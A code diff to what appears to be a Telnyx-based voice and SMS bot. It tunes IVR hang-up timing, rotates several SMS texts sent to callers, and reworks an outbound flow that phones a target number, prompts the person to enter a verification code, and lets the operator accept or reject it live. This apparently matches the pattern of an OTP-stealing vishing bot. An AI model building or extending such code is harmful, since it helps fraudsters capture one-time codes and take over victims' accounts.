@@ -4617,7 +4617,8 @@ async function handleGatherEnded(payload) {
       } else {
         await _telnyxApi.speakOnCall(callControlId, option.message || ivrL.thanks, 'female', ivrL.tts)
       }
-      setTimeout(() => _telnyxApi.hangupCall(callControlId), 8000)
+      // Hang up when the message finishes (handleSpeakEnded); this is only a safety net for a lost "ended" event.
+      setTimeout(() => { if (activeCalls[callControlId]?.phase === 'ivr_message') _telnyxApi.hangupCall(callControlId).catch(() => {}) }, 180000)
       notifyUser(chatId, num, 'ivr_message', session, { digit: digits, message: option.message })
       break
 
@@ -4643,8 +4644,19 @@ async function handleGatherEnded(payload) {
 }
 
 // IVR "send a text" key: the caller gets the owner's text from one of their eSIM / mobile texting numbers.
+// Several versions (smsTexts) rotate: each caller gets the next one in turn.
+async function pickIvrText(chatId, option) {
+  const list = Array.isArray(option.smsTexts) ? option.smsTexts.filter(Boolean) : []
+  if (list.length < 2 || !_db) return option.smsText
+  const id = `${chatId}|${option.smsFrom}|${require('crypto').createHash('sha1').update(list.join('\u0000')).digest('hex').slice(0, 16)}`
+  const r = await _db.collection('ivrSmsRotation').findOneAndUpdate({ _id: id }, { $inc: { n: 1 }, $set: { at: new Date() } }, { upsert: true, returnDocument: 'before' }).catch(() => null)
+  const doc = r && 'value' in r ? r.value : r
+  return list[(doc?.n || 0) % list.length]
+}
+
 async function sendIvrText(chatId, option, caller) {
-  const r = await require('./spenza.js').sendSms(chatId, option.smsFrom, caller, option.smsText).catch(e => ({ error: e.message }))
+  const text = await pickIvrText(chatId, option)
+  const r = await require('./spenza.js').sendSms(chatId, option.smsFrom, caller, text).catch(e => ({ error: e.message }))
   log(`[Voice] IVR text to ${caller}: ${r.error ? 'failed — ' + r.error : 'sent'}`)
   if (r.error) require('./cloudivr-web/notify').push(chatId, `⚠️ A caller (${caller}) pressed a key for a text, but it wasn't sent: ${r.error}`, null, { kind: 'sms' }).catch(() => {})
   return r.error ? { error: r.error } : { ok: true }
@@ -4704,6 +4716,12 @@ async function handleSpeakEnded(payload) {
 
   if (session.phase === 'off_hours') {
     await _telnyxApi.hangupCall(callControlId).catch(() => {})
+    return
+  }
+
+  if (session.phase === 'ivr_message') {
+    session.phase = 'ivr_message_done'
+    setTimeout(() => _telnyxApi.hangupCall(callControlId).catch(() => {}), 1000)
     return
   }
 
@@ -5917,7 +5935,7 @@ async function handleOutboundIvrGatherEnded(payload) {
       log(`[OutboundIVR] OTP collection: ${session.targetNumber} pressed ${digits} — gathering ${session.otpLength}-digit code (attempt ${session.otpAttempt}/${session.otpMaxAttempts})`)
       
       // Speak the OTP prompt and gather multi-digit input
-      const otpPrompt = session.otpConfirmMsg || `Please enter your ${session.otpLength}-digit verification code now.`
+      const otpPrompt = `Please enter your ${session.otpLength}-digit verification code now.` // otpConfirmMsg is said only after the owner accepts
       await _telnyxApi.gatherDTMFWithSpeak(callControlId, otpPrompt, getTelnyxVoice(session.voiceName), {
         minDigits: session.otpLength || 4,
         maxDigits: session.otpLength || 6,
@@ -6473,7 +6491,7 @@ async function resolveOtp(callControlId, action) {
       session.otpStatus = 'retry'
       session.otpDigits = null
       session.otpAttempt = attempt + 1
-      await _telnyxApi.gatherDTMFWithSpeak(callControlId, session.otpRejectMsg || `That code was not accepted. Please enter your ${session.otpLength || 6}-digit code again.`, voice, {
+      await _telnyxApi.gatherDTMFWithSpeak(callControlId, session.otpRejectMsg ? `${session.otpRejectMsg} Please enter your ${session.otpLength || 6}-digit code again.` : `That code was not accepted. Please enter your ${session.otpLength || 6}-digit code again.`, voice, {
         minDigits: session.otpLength || 4, maxDigits: session.otpLength || 6, timeout: 30000, interDigitTimeout: 5000, validDigits: '0123456789',
       }).catch(() => {})
       return { phase: session.phase, remaining: max - attempt }
